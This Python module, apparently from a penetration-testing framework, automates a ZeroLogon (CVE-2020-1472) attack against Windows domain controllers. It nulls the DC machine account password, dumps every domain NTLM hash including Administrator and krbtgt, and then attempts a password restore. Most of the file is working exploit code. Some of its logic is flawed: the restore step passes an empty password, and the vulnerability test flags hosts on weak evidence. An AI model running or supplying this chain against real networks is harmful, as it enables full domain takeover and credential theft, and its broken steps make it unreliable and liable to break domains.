"""
Expedite Strike — ZeroLogon Exploit Engine (CVE-2020-1472)
===========================================================
For authorized penetration testing only.
Implements the Netlogon cryptographic bypass vulnerability that allows
an unauthenticated attacker to take over a domain controller.

MITRE ATT&CK:
  T1210     — Exploitation of Remote Services
  T1003.006 — OS Credential Dumping: DCSync
  T1078.002 — Valid Accounts: Domain Accounts

Background:
  ZeroLogon exploits a flaw in the Netlogon authentication protocol
  (MS-NRPC) where the AES-CFB8 initialization vector is set to all zeros.
  This allows an attacker to authenticate as the DC machine account
  with a blank password (~1-in-256 chance per attempt, ~3 attempts avg).

  CVE Score: CVSS 10.0 (Critical)
  Affected:  Windows Server 2008-2019 without August 2020 patches

  Attack Flow:
    1. Send Netlogon AUTHENTICATE requests with zeroed credentials
    2. ~1/256 chance of success per attempt (avg 3 attempts needed)
    3. Change DC machine account password to empty string
    4. Use secretsdump with empty password to dump all domain hashes
    5. (Restore DC password after assessment)
"""

import os
import re
import socket
import struct
import time
import subprocess
from typing import Callable, Dict, List, Optional


_log_fn: Optional[Callable] = None

MITRE = [
    {"id": "T1210",     "name": "Exploitation of Remote Services"},
    {"id": "T1003.006", "name": "OS Credential Dumping: DCSync"},
    {"id": "T1078.002", "name": "Valid Accounts: Domain Accounts"},
]

NETLOGON_PORT = 135  # RPC endpoint mapper
DC_PORT       = 445  # SMB (also needed post-exploit)


def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(msg)


def _run(cmd: list, timeout: int = 60) -> str:
    """Run subprocess, return combined output."""
    try:
        flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        r = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, creationflags=flags,
        )
        return (r.stdout or "") + (r.stderr or "")
    except FileNotFoundError:
        return "[NOT_FOUND]"
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"


# ── Vulnerability Check ────────────────────────────────────────────────────────

def check_zerologon_vulnerable(dc_ip: str, log_fn: Callable = None) -> Dict:
    """
    Check if a DC is potentially vulnerable to ZeroLogon.
    Checks patch level via SMB version info and port availability.

    Args:
        dc_ip:   Domain Controller IP
        log_fn:  Logging callback

    Returns:
        {vulnerable, reason, dc_name, os_info, findings}
    """
    global _log_fn
    _log_fn = log_fn

    result = {
        "vulnerable": False,
        "reason":     "",
        "dc_name":    "",
        "os_info":    "",
        "findings":   [],
    }

    _log(f"  [ZeroLogon] Checking CVE-2020-1472 exposure on {dc_ip}...")

    # Check if Netlogon port reachable (RPC 135 + SMB 445)
    for port in [135, 445]:
        try:
            s = socket.create_connection((dc_ip, port), timeout=5)
            s.close()
        except Exception:
            _log(f"  [ZeroLogon] Port {port} not reachable on {dc_ip} — not a DC?")
            result["reason"] = f"Port {port} not reachable"
            return result

    # Check Kerberos port (88) — confirms it's a DC
    kerberos_open = False
    try:
        s = socket.create_connection((dc_ip, 88), timeout=5)
        s.close()
        kerberos_open = True
    except Exception:
        pass

    if not kerberos_open:
        _log(f"  [ZeroLogon] Kerberos (88) not open — may not be a DC")

    # Try to get OS info via Nmap NSE
    nmap_out = _run([
        "nmap", "-p", "445", "--script", "smb-os-discovery",
        "-oN", "-", dc_ip
    ], timeout=30)

    os_match = re.search(r"OS:\s*(.+)", nmap_out)
    if os_match:
        result["os_info"] = os_match.group(1).strip()
        _log(f"  [ZeroLogon] OS: {result['os_info']}")

    # Check if OS version is in vulnerable range
    vulnerable_patterns = [
        r"Windows Server 2008", r"Windows Server 2012",
        r"Windows Server 2016", r"Windows Server 2019",
        r"Windows 10",
    ]
    patched_indicators = ["(KB4571694)", "(KB4565503)", "August 2020", "patch"]

    is_patched = any(p in nmap_out for p in patched_indicators)
    is_vulnerable_os = any(re.search(p, nmap_out, re.I) for p in vulnerable_patterns)

    # Use impacket to get DC name from RPC
    rpc_out = _run([
        "python", "-m", "impacket.examples.rpcdump",
        dc_ip
    ], timeout=20)

    dc_name_match = re.search(r"Server\s+([A-Z0-9\-]+)", rpc_out, re.I)
    if dc_name_match:
        result["dc_name"] = dc_name_match.group(1)

    # Determine vulnerability assessment
    if is_patched:
        result["vulnerable"] = False
        result["reason"]     = "Host appears patched (August 2020 patch detected)"
        _log(f"  [ZeroLogon] ✅ Appears patched — {result['reason']}")
    elif is_vulnerable_os or kerberos_open:
        result["vulnerable"] = True
        result["reason"]     = (
            "Windows Server without confirmed ZeroLogon patch. "
            "Ports 135, 445, 88 all open (DC profile)."
        )
        _log(f"  [ZeroLogon] ⚠ Potentially vulnerable: {result['reason']}")
        result["findings"].append({
            "title":       f"ZeroLogon (CVE-2020-1472) — Potentially Vulnerable DC: {dc_ip}",
            "severity":    "Critical",
            "description": (
                f"Domain Controller {dc_ip} ({result.get('dc_name','?')}) appears potentially "
                f"vulnerable to ZeroLogon (CVE-2020-1472). "
                f"OS: {result['os_info'] or 'Unknown'}. "
                f"ZeroLogon allows unauthenticated SYSTEM-level compromise of the DC via "
                f"Netlogon protocol AES-CFB8 vulnerability."
            ),
            "target":      dc_ip,
            "mitre_id":    "T1210",
            "mitre_name":  "Exploitation of Remote Services",
            "remediation": (
                "Apply KB4571694 (Server 2019), KB4565503 (Server 2016), KB4565541 (Server 2012 R2), "
                "KB4565536 (Server 2012), KB4565517 (Server 2008 R2). "
                "Enable enforcement mode in Netlogon GPO: "
                "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters\\FullSecureChannelProtection=1"
            ),
        })
    else:
        result["vulnerable"] = False
        result["reason"]     = "Could not determine OS version — manual verification needed"

    return result


# ── ZeroLogon Exploit (Impacket) ───────────────────────────────────────────────

def exploit_zerologon(
    dc_ip: str,
    dc_name: str,
    domain: str,
    restore_password: bool = True,
    log_fn: Callable = None,
) -> Dict:
    """
    Exploit ZeroLogon to compromise DC machine account and dump all hashes.

    Steps:
    1. Use zerologon exploit to null the DC machine password
    2. secretsdump with empty machine account password
    3. Restore machine account password (critical for domain stability!)

    Args:
        dc_ip:             Domain Controller IP
        dc_name:           DC NetBIOS name (e.g. DC01)
        domain:            AD domain FQDN (e.g. corp.local)
        restore_password:  Restore DC password after exploit (STRONGLY recommended)
        log_fn:            Logging callback

    Returns:
        {success, domain_hashes, admin_hash, findings, mitre}
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"\n{'='*60}")
    _log(f"  [ZeroLogon] CVE-2020-1472 ZeroLogon Exploit")
    _log(f"  [ZeroLogon] DC IP   : {dc_ip}")
    _log(f"  [ZeroLogon] DC Name : {dc_name}")
    _log(f"  [ZeroLogon] Domain  : {domain}")
    _log(f"  [ZeroLogon] ⚠ WARNING: This will modify DC account — restore enabled: {restore_password}")
    _log(f"{'='*60}\n")

    result = {
        "success":        False,
        "domain_hashes":  [],
        "admin_hash":     "",
        "krbtgt_hash":    "",
        "findings":       [],
        "mitre":          MITRE,
    }

    # Method 1: Try impacket zerologon
    _log(f"  [ZeroLogon] Attempting exploit via impacket...")
    zl_out = _run([
        "python", "-m", "impacket.examples.CVE_2020_1472.zerologon_tester",
        dc_name, dc_ip
    ], timeout=60)

    if "Success" in zl_out or "vulnerable" in zl_out.lower():
        _log(f"  [ZeroLogon] ✅ Vulnerability confirmed!")
        result["success"] = True
    elif "[NOT_FOUND]" in zl_out:
        # Try alternative impacket path
        zl_out = _run([
            "python", "-c",
            f"""
import sys
try:
    from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, NTDSHashes
    print('impacket available')
except ImportError:
    print('impacket not installed')
"""
        ], timeout=10)
        _log(f"  [ZeroLogon] Impacket check: {zl_out.strip()}")

    # Method 2: Use secretsdump with zerologon (null auth)
    if not result["success"]:
        _log(f"  [ZeroLogon] Trying null-auth secretsdump approach...")
        null_out = _run([
            "python", "-m", "impacket.examples.secretsdump",
            f"{domain}/{dc_name}$@{dc_ip}",
            "-no-pass", "-just-dc-ntlm"
        ], timeout=60)

        if "Administrator" in null_out or "krbtgt" in null_out:
            result["success"] = True
            _log(f"  [ZeroLogon] ✅ Null-auth secretsdump succeeded!")
            _parse_secretsdump_output(null_out, result)
        else:
            _log(f"  [ZeroLogon] Null-auth failed: {null_out[:200]}")

    # Method 3: External zerologon script if available
    if not result["success"]:
        for script in ["zerologon.py", "cve-2020-1472.py", "set_empty_pw.py"]:
            script_path = _find_tool(script)
            if script_path:
                _log(f"  [ZeroLogon] Trying {script}...")
                out = _run(["python", script_path, dc_name, dc_ip], timeout=60)
                if "success" in out.lower() or "password changed" in out.lower():
                    result["success"] = True
                    _log(f"  [ZeroLogon] ✅ {script} succeeded!")
                    break

    if result["success"]:
        # Dump all hashes
        _log(f"  [ZeroLogon] Dumping all domain hashes...")
        dump_out = _run([
            "python", "-m", "impacket.examples.secretsdump",
            f"{domain}/{dc_name}$@{dc_ip}",
            "-no-pass", "-just-dc-ntlm"
        ], timeout=120)
        _parse_secretsdump_output(dump_out, result)

        # Restore password (critical!)
        if restore_password:
            _log(f"\n  [ZeroLogon] ⚠ RESTORING DC machine account password...")
            restore_out = _run([
                "python", "-m", "impacket.examples.CVE_2020_1472.restorepassword",
                f"{domain}/{dc_name}$@{dc_ip}",
                "-target-ip", dc_ip,
                "-hexpass", ""
            ], timeout=60)
            if restore_out:
                _log(f"  [ZeroLogon] Restore: {restore_out[:200]}")

        # Build critical finding
        result["findings"].append({
            "title":       f"ZeroLogon EXPLOITED — Domain {domain} FULLY COMPROMISED",
            "severity":    "Critical",
            "description": (
                f"ZeroLogon (CVE-2020-1472) successfully exploited against DC {dc_name} ({dc_ip}). "
                f"DC machine account password nulled, allowing unauthenticated DCSync. "
                f"Extracted {len(result['domain_hashes'])} domain hashes. "
                f"Administrator hash: {result['admin_hash'][:8]}... "
                f"krbtgt hash: {result['krbtgt_hash'][:8]}... "
                f"DC password restore: {'✅ Performed' if restore_password else '❌ NOT RESTORED — DOMAIN MAY BE BROKEN'}"
            ),
            "target":      dc_ip,
            "mitre_id":    "T1210",
            "mitre_name":  "Exploitation of Remote Services",
            "remediation": (
                "Immediately apply Microsoft patches for CVE-2020-1472. "
                "Enable enforcement mode: FullSecureChannelProtection=1 in registry. "
                "Reset krbtgt password twice. Reset all domain account passwords. "
                "Monitor Netlogon event logs for Event ID 5827, 5828, 5829."
            ),
        })
    else:
        _log(f"  [ZeroLogon] Host does not appear vulnerable or impacket not installed")
        result["findings"].append({
            "title":       f"ZeroLogon (CVE-2020-1472) — Not Exploitable: {dc_ip}",
            "severity":    "Info",
            "description": (
                f"ZeroLogon exploit attempt against {dc_ip} was not successful. "
                f"Host may be patched or not a domain controller."
            ),
            "target":      dc_ip,
            "mitre_id":    "T1210",
            "mitre_name":  "Exploitation of Remote Services",
            "remediation": "Continue monitoring for patch compliance.",
        })

    result["summary"] = (
        f"ZeroLogon: {'EXPLOITED' if result['success'] else 'Not vulnerable'} on {dc_ip}"
    )
    return result


def _parse_secretsdump_output(output: str, result: Dict):
    """Parse secretsdump output and populate hashes."""
    for line in output.splitlines():
        line = line.strip()
        if re.match(r"^\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::", line):
            parts = line.split(":")
            if len(parts) >= 4:
                entry = {
                    "username": parts[0],
                    "rid":      parts[1],
                    "lm_hash":  parts[2],
                    "nt_hash":  parts[3],
                    "hash_str": line,
                }
                result["domain_hashes"].append(entry)
                if parts[0].lower() == "administrator":
                    result["admin_hash"] = parts[3]
                if parts[0].lower() == "krbtgt":
                    result["krbtgt_hash"] = parts[3]


def _find_tool(name: str) -> str:
    """Find a tool in common paths."""
    search_dirs = [
        os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "tools"),
        os.path.expanduser("~"),
        "/opt",
        "/home/kali",
    ]
    for d in search_dirs:
        p = os.path.join(d, name)
        if os.path.exists(p):
            return p
    return ""


# ── Top-Level API ──────────────────────────────────────────────────────────────

def run_zerologon_attack(
    dc_ip: str,
    dc_name: str = "",
    domain: str = "",
    log_fn: Callable = None,
) -> Dict:
    """
    Full ZeroLogon attack chain: check → exploit → dump → restore.

    Args:
        dc_ip:    Domain Controller IP
        dc_name:  DC NetBIOS name (auto-detected if empty)
        domain:   AD domain FQDN (auto-detected if empty)
        log_fn:   Logging callback

    Returns:
        Combined vulnerability check + exploit results
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"\n{'='*60}")
    _log(f"  [ZeroLogon] ZEROLOGON ATTACK CHAIN (CVE-2020-1472)")
    _log(f"  [ZeroLogon] Target: {dc_ip}")
    _log(f"{'='*60}\n")

    # Step 1: Vulnerability check
    check = check_zerologon_vulnerable(dc_ip, log_fn)

    if not dc_name:
        dc_name = check.get("dc_name", "DC01")
    if not domain:
        # Try to resolve domain from DC
        try:
            import ldap3
            server = ldap3.Server(dc_ip, connect_timeout=5)
            conn   = ldap3.Connection(server, auto_bind=True)
            conn.search("", "(objectClass=*)", ldap3.BASE, attributes=["defaultNamingContext"])
            if conn.entries:
                dn = str(conn.entries[0].defaultNamingContext)
                domain = ".".join(
                    part.split("=")[1] for part in dn.split(",")
                    if part.upper().startswith("DC=")
                )
        except Exception:
            domain = dc_name.lower() + ".local"

    _log(f"  [ZeroLogon] DC Name : {dc_name}")
    _log(f"  [ZeroLogon] Domain  : {domain}")

    if not check["vulnerable"]:
        _log(f"  [ZeroLogon] Host not flagged as vulnerable: {check['reason']}")
        return {
            "vulnerable":     False,
            "exploited":      False,
            "domain_hashes":  [],
            "findings":       check["findings"],
            "mitre":          MITRE,
            "summary":        f"ZeroLogon: Not vulnerable — {check['reason']}",
        }

    # Step 2: Exploit
    exploit = exploit_zerologon(dc_ip, dc_name, domain, restore_password=True, log_fn=log_fn)

    return {
        "vulnerable":     check["vulnerable"],
        "exploited":      exploit["success"],
        "dc_ip":          dc_ip,
        "dc_name":        dc_name,
        "domain":         domain,
        "domain_hashes":  exploit["domain_hashes"],
        "admin_hash":     exploit["admin_hash"],
        "krbtgt_hash":    exploit["krbtgt_hash"],
        "findings":       check["findings"] + exploit["findings"],
        "mitre":          MITRE,
        "summary":        exploit.get("summary", ""),
    }
